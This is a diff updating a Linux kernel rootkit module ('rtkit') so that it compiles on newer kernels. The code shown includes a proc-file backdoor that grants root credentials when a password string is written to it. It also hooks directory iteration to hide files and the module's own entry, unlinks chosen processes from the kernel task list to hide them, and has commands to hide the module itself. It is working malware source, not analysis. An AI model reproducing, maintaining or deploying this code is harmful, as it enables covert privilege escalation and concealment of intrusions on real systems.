@@ -6,12 +6,12 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/kernel.h>
-
+//#include <linux/sched/signal.h>
 #include <linux/proc_ns.h>
 #include <linux/spinlock.h>
 #include <linux/atomic.h>
 #include <linux/binfmts.h>
-
+#include <linux/uaccess.h>
 /*
  * This is not completely implemented yet. The idea is to
  * create an in-memory tree (like the actual /proc filesystem
@@ -34,12 +34,12 @@ struct proc_dir_entry {
     const struct file_operations *proc_fops;
     struct proc_dir_entry *next, *parent, *subdir;
     void *data;
-    atomic_t count;     /* use count */
-    atomic_t in_use;    /* number of callers into module in progress; */
-            /* negative -> it's going away RSN */
+    atomic_t count;     // use count
+    atomic_t in_use;    // number of callers into module in progress;
+            // negative -> it's going away RSN
     struct completion *pde_unload_completion;
-    struct list_head pde_openers;   /* who did ->open, but not ->release */
-    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+    struct list_head pde_openers;   // who did ->open, but not ->release
+    spinlock_t pde_unload_lock; // proc_fops checks and pde_users bumps 
     u8 namelen;
     char name[];
 };
@@ -131,11 +131,10 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 	if (!strcmp(name, "rtkit")) return 0;
 	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
-
 static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
 {
 	proc_filldir_orig = ctx->actor;
-    *((filldir_t *)&ctx->actor) = &proc_filldir_new;
+   *((filldir_t *)&(ctx->actor)) = &proc_filldir_new;
 	return proc_iterate_orig(filp, ctx);
 }
 
@@ -148,13 +147,13 @@ static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offse
 static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
 	fs_filldir_orig = ctx->actor;
-    *((filldir_t *)&ctx->actor) = &fs_filldir_new;
+   *((filldir_t *)&ctx->actor) = &fs_filldir_new;
 	return fs_iterate_orig(filp, ctx);
 }
 
 static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos)
 {
-	if (count > temp)
+   if (count > temp)
         count = temp;
     temp = temp-count;
   
@@ -179,18 +178,18 @@ static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, 
 
         size = strlen(module_status);
         temp = size;
-	
+   
     }
   
-	return count;
+   return count;
 }
 
 static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *ppos)
 {
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-		credentials->uid = credentials->euid = 0;
-		credentials->gid = credentials->egid = 0;
+		credentials->uid.val = credentials->euid.val = 0;
+		credentials->gid.val = credentials->egid.val = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
@@ -205,7 +204,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
             for_each_process(p) {
                 kstrtol(pid_s, 10, &pid);
                 if (pid == p->pid) {
-                    printk("----------%d: %s\n", pid, p->comm);
+                    printk("----------%ld: %s\n", pid, p->comm);
                     proc_to_hide[current_pid] = p;
                     //list_del(&p->tasks);
                     p->tasks.prev->next = p->tasks.next;
@@ -227,7 +226,29 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 
         return count;
 }
-
+/*
+static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
+{
+   if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
+      struct cred *credentials = prepare_creds();
+      credentials->uid.val = credentials->euid.val = 0;
+      credentials->gid.val = credentials->egid.val = 0;
+      commit_creds(credentials);
+   } else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
+      if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+   } else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
+      if (current_pid > 0) current_pid--;
+   } else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
+      hide_files = !hide_files;
+   } else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
+      module_hide();
+   } else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
+      module_show();
+   }
+   
+        return count;
+}
+*/
 //INITIALIZING/CLEANING HELPER METHODS SECTION
 static void procfs_clean(void)
 {
